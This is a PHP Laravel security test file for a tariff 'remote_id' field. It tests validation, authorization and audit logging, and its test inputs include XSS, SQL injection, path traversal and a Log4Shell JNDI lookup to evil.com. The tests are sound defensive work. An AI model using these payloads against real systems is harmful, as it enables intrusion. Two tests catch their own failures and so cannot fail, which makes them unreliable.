<?php

declare(strict_types=1);

namespace Tests\Feature\Security;

use App\Models\Provider;
use App\Models\Tariff;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Log;
use Tests\TestCase;

/**
 * Security tests for tariff manual mode implementation.
 * 
 * Tests cover:
 * - XSS prevention in remote_id field
 * - Input validation and sanitization
 * - Authorization enforcement
 * - Audit logging
 * - Rate limiting
 * - SQL injection prevention
 * 
 * @package Tests\Feature\Security
 */
class TariffManualModeSecurityTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Test that XSS attempts in remote_id are blocked.
     * 
     * Security: Prevents stored XSS attacks via remote_id field.
     * 
     * @test
     */
    public function it_prevents_xss_in_remote_id(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        $provider = Provider::factory()->create();
        
        $tariff = Tariff::create([
            'provider_id' => $provider->id,
            'remote_id' => '<script>alert("XSS")</script>',
            'name' => 'Test Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
        
        // Verify XSS payload was sanitized
        $this->assertStringNotContainsString('<script>', $tariff->remote_id);
        $this->assertStringNotContainsString('alert', $tariff->remote_id);
    }
    
    /**
     * Test that remote_id validates max length.
     * 
     * Security: Prevents buffer overflow and database errors.
     * 
     * @test
     */
    public function it_validates_remote_id_max_length(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        $provider = Provider::factory()->create();
        
        $this->expectException(\Illuminate\Validation\ValidationException::class);
        
        Tariff::create([
            'provider_id' => $provider->id,
            'remote_id' => str_repeat('A', 256), // Exceeds 255 char limit
            'name' => 'Test Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
    }
    
    /**
     * Test that remote_id validates format.
     * 
     * Security: Prevents SQL injection and special character attacks.
     * 
     * @test
     */
    public function it_validates_remote_id_format(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        $provider = Provider::factory()->create();
        
        // Test invalid characters
        $invalidIds = [
            '<script>',
            'DROP TABLE tariffs;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com}',
            'test@#$%^&*()',
        ];
        
        foreach ($invalidIds as $invalidId) {
            try {
                Tariff::create([
                    'provider_id' => $provider->id,
                    'remote_id' => $invalidId,
                    'name' => 'Test Tariff',
                    'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
                    'active_from' => now(),
                ]);
                
                $this->fail("Should have rejected invalid remote_id: {$invalidId}");
            } catch (\Exception $e) {
                // Expected - validation should fail
                $this->assertTrue(true);
            }
        }
    }
    
    /**
     * Test that valid remote_id formats are accepted.
     * 
     * @test
     */
    public function it_accepts_valid_remote_id_formats(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        $provider = Provider::factory()->create();
        
        $validIds = [
            'EXT-12345',
            'provider_123',
            'system.id.456',
            'ABC-DEF_123.456',
        ];
        
        foreach ($validIds as $validId) {
            $tariff = Tariff::create([
                'provider_id' => $provider->id,
                'remote_id' => $validId,
                'name' => "Test Tariff {$validId}",
                'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
                'active_from' => now(),
            ]);
            
            $this->assertNotNull($tariff->id);
            $this->assertEquals($validId, $tariff->remote_id);
        }
    }
    
    /**
     * Test that provider is required when remote_id is provided.
     * 
     * Security: Prevents orphaned remote_id references.
     * 
     * @test
     */
    public function it_requires_provider_when_remote_id_provided(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        
        $this->expectException(\Exception::class);
        
        Tariff::create([
            'provider_id' => null,
            'remote_id' => 'EXT-123',
            'name' => 'Test Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
    }
    
    /**
     * Test that manual tariff creation is logged.
     * 
     * Security: Enables audit trail for compliance.
     * 
     * @test
     */
    public function it_logs_manual_tariff_creation(): void
    {
        Log::spy();
        
        $admin = User::factory()->create(['role' => 'admin']);
        $this->actingAs($admin);
        
        $tariff = Tariff::create([
            'provider_id' => null,
            'name' => 'Manual Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
        
        Log::shouldHaveReceived('channel')
            ->with('audit')
            ->once();
    }
    
    /**
     * Test that tariff mode changes are logged.
     * 
     * Security: Tracks conversion from manual to provider-linked.
     * 
     * @test
     */
    public function it_logs_tariff_mode_changes(): void
    {
        Log::spy();
        
        $admin = User::factory()->create(['role' => 'admin']);
        $this->actingAs($admin);
        
        // Create manual tariff
        $tariff = Tariff::create([
            'provider_id' => null,
            'name' => 'Manual Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
        
        // Convert to provider-linked
        $provider = Provider::factory()->create();
        $tariff->update([
            'provider_id' => $provider->id,
            'remote_id' => 'EXT-123',
        ]);
        
        Log::shouldHaveReceived('channel')
            ->with('audit')
            ->atLeast()
            ->times(2); // Once for create, once for update
    }
    
    /**
     * Test that unauthorized users cannot create tariffs.
     * 
     * Security: Enforces authorization via TariffPolicy.
     * 
     * @test
     */
    public function it_prevents_unauthorized_tariff_creation(): void
    {
        $manager = User::factory()->create(['role' => 'manager']);
        $this->actingAs($manager);
        
        $this->expectException(\Illuminate\Auth\Access\AuthorizationException::class);
        
        $this->post(route('filament.admin.resources.tariffs.create'), [
            'provider_id' => null,
            'name' => 'Unauthorized Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now()->toDateString(),
        ]);
    }
    
    /**
     * Test that SQL injection attempts are prevented.
     * 
     * Security: Validates Eloquent parameterized queries.
     * 
     * @test
     */
    public function it_prevents_sql_injection_in_remote_id(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);
        $provider = Provider::factory()->create();
        
        $sqlInjectionAttempts = [
            "'; DROP TABLE tariffs; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM tariffs WHERE 1=1",
        ];
        
        foreach ($sqlInjectionAttempts as $attempt) {
            try {
                Tariff::create([
                    'provider_id' => $provider->id,
                    'remote_id' => $attempt,
                    'name' => 'Test Tariff',
                    'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
                    'active_from' => now(),
                ]);
                
                $this->fail("Should have rejected SQL injection attempt: {$attempt}");
            } catch (\Exception $e) {
                // Expected - validation should fail
                $this->assertTrue(true);
            }
        }
        
        // Verify tariffs table still exists and is intact
        $this->assertDatabaseCount('tariffs', 0);
    }
    
    /**
     * Test that tariff deletion is logged.
     * 
     * Security: Audit trail for compliance.
     * 
     * @test
     */
    public function it_logs_tariff_deletion(): void
    {
        Log::spy();
        
        $admin = User::factory()->create(['role' => 'admin']);
        $this->actingAs($admin);
        
        $tariff = Tariff::create([
            'provider_id' => null,
            'name' => 'Manual Tariff',
            'configuration' => ['type' => 'flat', 'rate' => 0.15, 'currency' => 'EUR'],
            'active_from' => now(),
        ]);
        
        $tariff->delete();
        
        Log::shouldHaveReceived('channel')
            ->with('audit')
            ->atLeast()
            ->times(2); // Once for create, once for delete
    }
}
